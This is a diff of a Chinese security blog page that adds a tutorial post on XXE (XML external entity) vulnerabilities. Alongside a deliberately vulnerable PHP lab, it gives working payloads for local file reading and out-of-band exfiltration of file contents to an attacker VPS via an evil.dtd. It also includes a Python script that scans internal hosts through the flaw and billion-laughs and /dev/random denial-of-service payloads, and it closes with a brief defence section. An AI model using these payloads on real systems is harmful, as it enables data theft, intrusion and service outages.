@@ -6,15 +6,25 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://172.30.61.219:4000">
-  <title>Archives: 2019 | Stay bolg</title>
+  <title>XXE学习 | Stay bolg</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Stay bolg">
-<meta property="og:url" content="http://172.30.61.219:4000/archives/2019/index.html">
+  <meta name="description" content="xxe漏洞原理，代码审计如何寻找">
+<meta name="keywords" content="渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XXE学习">
+<meta property="og:url" content="http://172.30.61.219:4000/2019/12/26/XXE学习/index.html">
 <meta property="og:site_name" content="Stay bolg">
+<meta property="og:description" content="xxe漏洞原理，代码审计如何寻找">
 <meta property="og:locale" content="en">
+<meta property="og:image" content="http://172.30.61.219:4000/images/xml-1.jpg">
+<meta property="og:image" content="http://172.30.61.219:4000/images/xml-2.jpg">
+<meta property="og:image" content="http://172.30.61.219:4000/images/xml-3.jpg">
+<meta property="og:image" content="http://172.30.61.219:4000/2019/12/26/XXE学习/images/xml-4.jpg">
+<meta property="og:updated_time" content="2019-12-26T11:58:57.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Stay bolg">
+<meta name="twitter:title" content="XXE学习">
+<meta name="twitter:description" content="xxe漏洞原理，代码审计如何寻找">
+<meta name="twitter:image" content="http://172.30.61.219:4000/images/xml-1.jpg">
   
     <link rel="alternative" href="/atom.xml" title="Stay bolg" type="application/atom+xml">
   
@@ -154,36 +164,105 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-XXE学习" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      XXE学习
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/12/26/XXE学习/" class="archive-article-date">
+
+        
+        <a href="/2019/12/26/XXE学习/" class="archive-article-date">
   	<time datetime="2019-12-26T11:53:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-12-26</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/12/26/XXE学习/">XXE学习</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><code>xxe</code>漏洞原理，代码审计如何寻找<a id="more"></a></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的 </span><br><span class="line">dtd的作用就是去定义xml文档的合法构建模块，也就是说声明了xml的内容格式规范</span><br></pre></td></tr></table></figure>
 
-        <div class="article-info info-on-right">
-          
+<p>这里解释一下DTD</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dtd 有两种声明方式：</span><br><span class="line">1、内部dtd：即对XML文档中的元素、属性和实体的DTD的声明都在XML文档中。 </span><br><span class="line">2、外部dtd：即对XML文档中的元素、属性和实体的DTD的声明都在一个独立的DTD文件（.dtd）中。</span><br></pre></td></tr></table></figure>
+
+<p>这里的示例，我们一个一个来看一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--XML声明--&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!--DTD，文档类型声明--&gt;</span><br><span class="line">&lt;!DOCTYPE note   #定义此文档是note类型的文档</span><br><span class="line">[&lt;!ELEMENT note (body)&gt;  #定义note元素有一个元素：&quot;body&quot;</span><br><span class="line">    &lt;!ELEMENT body (#PCDATA)&gt;  #定义 body 元素为 &quot;#PCDATA&quot; 类型</span><br><span class="line">    &lt;!ENTITY writer &quot;hello word&quot;&gt;  #定义了一个内部实体</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;!--文档元素--&gt; </span><br><span class="line">&lt;note&gt;&lt;body&gt;&amp;writer&lt;/body&gt;&lt;/note&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE foo </span></span><br><span class="line"><span class="meta">[&lt;!ELEMENT foo ANY &gt;  #定义元素为 ANY,即可以接受任何元素</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "file:///c:/test.dtd" &gt;]&gt;</span>  #定义了一个外部实体</span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span>&amp;xxe<span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"></span><br><span class="line">#这是一种用 SYSTEM 关键字的引用方式，还有一种用 PUBLIC 引用公用 DTD 的方式</span><br><span class="line"><span class="meta">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>详细的信息可以在网上找具体了解一下</p>
+<p>借鉴网上大神用<code>php</code>搭建一个简易环境，源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">libxml_disable_entity_loader (<span class="keyword">false</span>);  <span class="comment">#禁用加载外部实体功能(关闭)</span></span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);  <span class="comment">#把整个文件读入一个字符串中</span></span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();  <span class="comment">#独写xml</span></span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);  <span class="comment">#解析一个XML标签字符串来组成该文档</span></span><br><span class="line"><span class="comment">#LIBXML_NOENT————替代实体   LIBXML_DTDLOAD————加载外部子集</span></span><br><span class="line">$creds = simplexml_import_dom($dom);  <span class="comment">#把DOM节点转换为SimpleXMLElement对象</span></span><br><span class="line"><span class="keyword">echo</span> $creds;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#-&gt;是对象执行方法或取得属性用的</span></span><br><span class="line"><span class="comment">#=&gt;是数组里键和值对应用的</span></span><br></pre></td></tr></table></figure>
+
+<p>访问这个文件，然后<code>burpsuite</code>抓包，这里要做一件事，就是需要把<code>get</code>请求转换为<code>post</code>请求</p>
+<p>在<code>post</code>报文中提交<code>payload</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE creds </span></span><br><span class="line"><span class="meta">[&lt;!ENTITY xxe SYSTEM "file:///c:/windows/system.ini"&gt; ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这样就可以读取出<code>system.ini</code>文件了</p>
+<p>但是当我们去读其他的文件时读取不了，怎么办？ 我们可以将脚本代码定义为<code>CDATA</code>，<code>CDATA</code>部分中的所有内容就会被解析器忽略，但是还有个问题 <code>xml</code>解析器有个限制条件是禁止内部参数实体引用，所以我们需要将内容换到外部，在自己的vps上放一个<code>.dtd</code>文件去读取</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#原来的payload读取不了其他的文件，如果使用CDATA，payload就变为</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE roottag</span><br><span class="line">[&lt;!ENTITY start &quot;&lt;![CDATA[&lt;!ENTITY % xxe SYSTEM &quot;file:///d:/test.txt&quot;&gt; ]]&gt; &quot;&gt;]% xxe;&gt;</span><br><span class="line">&lt;roottag&gt;&amp;start&lt;/roottag&gt;</span><br><span class="line"></span><br><span class="line">#就是因为禁止内部参数实体引用，所以还是读取不了，我们再修改一下payload</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root</span><br><span class="line">[&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % go SYSTEM &quot;file:///d:/test.txt&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % dtd SYSTEM &quot;http://vps/evil.dtd&quot;&gt; %dtd; ]&gt; </span><br><span class="line">&lt;root&gt;&amp;all;&lt;/root&gt;</span><br><span class="line"></span><br><span class="line">#在vps上新建一个文件evil.dtd，内容为</span><br><span class="line">&lt;!ENTITY all &quot;%start;%go;%end;&quot;&gt;</span><br><span class="line">#这样就可以读取本机上的任意文件了</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/xml-1.jpg" alt="xml-1"></p>
+<p>随着技术越来越成熟，现在回显的<code>xml</code>基本上很少了，所以我们就得想想怎么利用无回显的漏洞，通过上面的例子应该可以猜出什么了对吧，没错，就是外部链接，既然他可以读取外部链接，那么也就可以发送了</p>
+<p>我们这里写两个外部参数实体，一个是请求本地内容，一个是将内容发送到<code>vps</code>，这里发送时使用的协议可以是各种各样的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#payload</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ENTITY % remote SYSTEM &quot;http://myvps/xml.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///d:/test.txt&quot;&gt; %remote;%send;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;message&gt;1234&lt;/message&gt;</span><br><span class="line"></span><br><span class="line">#vps evil.dtd</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://127.0.0.1:8888/?%file;&apos;&gt;&quot;&gt;%start;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/xml-2.jpg" alt="xml-2"></p>
+<p>成功，这里读取的数据经过base64解密即可</p>
+<p>下面该做点什么呢？？？</p>
+<p>我们尝试读取一下内网的信息，比如探测内网信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#payload</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=http://192.168.1.*/&quot;&gt;]&gt;  #通过php://filter读取,只需要遍历*即可</span><br><span class="line">&lt;xml&gt;</span><br><span class="line">    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;</span><br><span class="line">&lt;/xml&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/xml-3.jpg" alt="xml-3"></p>
+<p>上面就是探测到的内网未存活主机</p>
+<p><img src="images/xml-4.jpg" alt="xml-4"></p>
+<p>上面就是探测到的存活的主机</p>
+<p>这里我写了个脚本，可以直接批量探测</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">137</span>, <span class="number">141</span>):</span><br><span class="line">	ip = <span class="string">"172.30.61."</span> + str(i)</span><br><span class="line">	headers = &#123;<span class="string">'Content-Type'</span>: <span class="string">'application/xml'</span>&#125;</span><br><span class="line">	string = <span class="string">'php://filter/convert.base64-encode/resource=http://'</span> + ip + <span class="string">'/'</span></span><br><span class="line">	<span class="keyword">print</span> (string)</span><br><span class="line">	xml = <span class="string">"""&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;"""</span></span><br><span class="line">	xml = xml + <span class="string">"\r\n"</span> + <span class="string">"""&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;"""</span></span><br><span class="line">	xml = xml + <span class="string">"\r\n"</span> + <span class="string">"""&lt;!ENTITY xxe SYSTEM """</span> + <span class="string">'"'</span> + string + <span class="string">'"'</span> + <span class="string">"""&gt;]&gt;"""</span></span><br><span class="line">	xml = xml + <span class="string">"\r\n"</span> + <span class="string">"""&lt;xml&gt;"""</span></span><br><span class="line">	xml = xml + <span class="string">"\r\n"</span> + <span class="string">"""    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;"""</span></span><br><span class="line">	xml = xml + <span class="string">"\r\n"</span> + <span class="string">"""&lt;/xml&gt;"""</span></span><br><span class="line">	result = requests.post(<span class="string">'http://127.0.0.1/phpphinf.php'</span>, data=xml, headers=headers, timeout=<span class="number">50</span>)</span><br><span class="line">	<span class="keyword">print</span> (len(result.text))</span><br><span class="line">    </span><br><span class="line"><span class="comment">#通过判断返回结果的长度来判断主机是否存货</span></span><br></pre></td></tr></table></figure>
+
+<p>除了可以探测内网信息，还可以进行DOS攻击，这里就不做演示了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#windows  payload可以在内存中将小型XML文档扩展到超过3GB而使服务器崩溃</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE lolz [  &lt;!ENTITY lol &quot;lol&quot;&gt;  &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;  &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;  &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;  &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;  &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;  &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;  &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;  &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;]&gt;&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br><span class="line"></span><br><span class="line">#UNIX   payload会让xml解析器尝试使用/dev/random文件中的内容来替代实体造成DOS</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [   &lt;!ELEMENT foo ANY &gt;  &lt;!ENTITY xxe SYSTEM &quot;file:///dev/random&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在一些特定的情况下可以进行钓鱼，RCE等等操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root[&lt;!ENTITY cmd SYSTEM &quot;ip://port&quot;&gt;]&gt;&lt;dir&gt;&lt;file&gt;&amp;cmd;&lt;/file&gt;&lt;/dir&gt;</span><br></pre></td></tr></table></figure>
+
+<p>防御措施</p>
+<p>方案一 使用开发语言提供的禁用外部实体的方法</p>
+<p>方案二黑白名单限制过滤关键字</p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -195,163 +274,105 @@
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://172.30.61.219:4000/2019/12/26/XXE学习/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/10/10/反弹shell的各种姿势/" class="archive-article-date">
-  	<time datetime="2019-10-10T12:49:21.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-10</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2019/10/10/反弹shell的各种姿势/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">反弹shell的各种姿势</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/10/10/反弹shell的各种姿势/">反弹shell的各种姿势</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">渗透</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/24/泛微e-cology-OA命令执行/" class="archive-article-date">
-  	<time datetime="2019-09-24T15:14:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-24</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/09/24/泛微e-cology-OA命令执行/">泛微e_cology_OA命令执行</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">渗透</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/21/XSS漏洞的原理以及挖掘方式/" class="archive-article-date">
-  	<time datetime="2019-09-21T04:29:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-21</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/09/21/XSS漏洞的原理以及挖掘方式/">XSS漏洞的原理以及挖掘方式</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/21/关于防火墙的一些知识/" class="archive-article-date">
-  	<time datetime="2019-09-21T04:25:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-21</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/09/21/关于防火墙的一些知识/">关于防火墙的一些知识</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Daily</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/archives/2019/page/2/">2</a><a class="page-number" href="/archives/2019/page/3/">3</a><a class="extend next" rel="next" href="/archives/2019/page/2/">Next &raquo;</a>
-    </nav>
   
 
 
@@ -375,8 +396,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
